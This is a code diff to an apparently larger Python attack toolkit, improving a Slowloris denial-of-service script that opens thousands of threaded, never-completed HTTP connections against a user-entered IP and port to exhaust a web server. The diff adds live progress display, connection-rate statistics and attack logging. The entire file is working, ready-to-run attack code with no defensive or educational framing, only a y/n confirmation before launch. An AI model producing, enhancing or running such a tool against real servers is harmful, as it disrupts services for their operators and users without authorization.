@@ -1,29 +1,28 @@
+#!/usr/bin/env python3
+# Slowloris Attack with Real-time Live Logs
+
 import socket
 import threading
 import time
 from modules.utils import pcolor, resolve
 from modules.logger import save_log
 
-def slowloris_attack(ip, port, stop, stats):
+def slowloris_attack(ip, port, stop_event, stats):
     sockets = []
-    while not stop.is_set():
+    while not stop_event.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
             s.connect((ip, port))
-            
-            # Send partial HTTP request (never completes)
             request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n"
             s.send(request.encode())
             sockets.append(s)
-            stats['p'] += 1
+            stats['packets'] += 1
             
-            # Keep connections open
             if len(sockets) > 500:
                 sockets.pop(0).close()
-                
         except:
-            stats['e'] += 1
+            stats['errors'] += 1
 
 def slowloris():
     pcolor("b", "\n[ SLOWLORIS ATTACK ]\n")
@@ -38,39 +37,65 @@ def slowloris():
     else:
         ip = target
     
-    port = int(input("Port (80): ") or 80)
-    threads = int(input("Connections (2000): ") or 2000)
-    duration = int(input("Duration (60 sec): ") or 60)
+    port = int(input("Port (default 80): ") or 80)
+    threads = int(input("Connections (1000-5000, default 2000): ") or 2000)
+    duration = int(input("Duration in seconds (default 60): ") or 60)
     
     print(f"\nTarget: {ip}:{port}")
     print(f"Connections: {threads}")
     print(f"Duration: {duration}s")
     
     confirm = input("\nStart attack? (y/n): ")
-    if confirm != 'y':
+    if confirm.lower() != 'y':
         return
     
-    stop = threading.Event()
-    stats = {'p': 0, 'e': 0}
+    stop_event = threading.Event()
+    stats = {'packets': 0, 'errors': 0}
     
     for _ in range(threads):
-        threading.Thread(target=slowloris_attack, args=(ip, port, stop, stats), daemon=True).start()
+        t = threading.Thread(target=slowloris_attack, args=(ip, port, stop_event, stats))
+        t.daemon = True
+        t.start()
     
     pcolor("g", f"\n[!] SLOWLORIS ATTACK STARTED on {ip}:{port}")
-    pcolor("y", "[!] Keeping connections open...")
-    start = time.time()
+    pcolor("y", "[!] Keeping connections open... Press Ctrl+C to stop\n")
+    
+    start_time = time.time()
+    last_packets = 0
     
     try:
-        while time.time() - start < duration:
-            remaining = int(duration - (time.time() - start))
-            print(f"\r[LIVE] Open connections: {stats['p']} | Failed: {stats['e']} | Time: {remaining}s    ", end="")
+        while time.time() - start_time < duration:
+            elapsed = int(time.time() - start_time)
+            remaining = duration - elapsed
+            
+            pps = stats['packets'] - last_packets
+            last_packets = stats['packets']
+            
+            bar_length = 30
+            progress = int((elapsed / duration) * bar_length)
+            bar = "█" * progress + "░" * (bar_length - progress)
+            
+            print(f"\r[{bar}] {elapsed}/{duration}s | "
+                  f"✅ Connections: {stats['packets']:,} | "
+                  f"❌ Failed: {stats['errors']:,} | "
+                  f"⚡ {pps} c/s    ", end="")
+            
             time.sleep(1)
+        
+        print()
+        
     except KeyboardInterrupt:
-        pcolor("y", "\n[!] Stopping...")
+        pcolor("y", "\n\n[!] Attack stopped by user")
     finally:
-        stop.set()
-        pcolor("g", f"\n\n[+] ATTACK FINISHED")
-        print(f"Connections opened: {stats['p']}")
-        save_log(ip, port, "SLOWLORIS", threads, duration, stats['p'], stats['e'])
+        stop_event.set()
+        
+        print("\n" + "="*60)
+        pcolor("g", "[+] ATTACK FINISHED")
+        print(f"[📊] Total connections opened: {stats['packets']:,}")
+        print(f"[⚠️] Failed connections: {stats['errors']:,}")
+        print("="*60)
+        
+        save_log(ip, port, "SLOWLORIS", threads, duration, 
+                 stats['packets'], stats['errors'])
     
     input("\nPress Enter...")
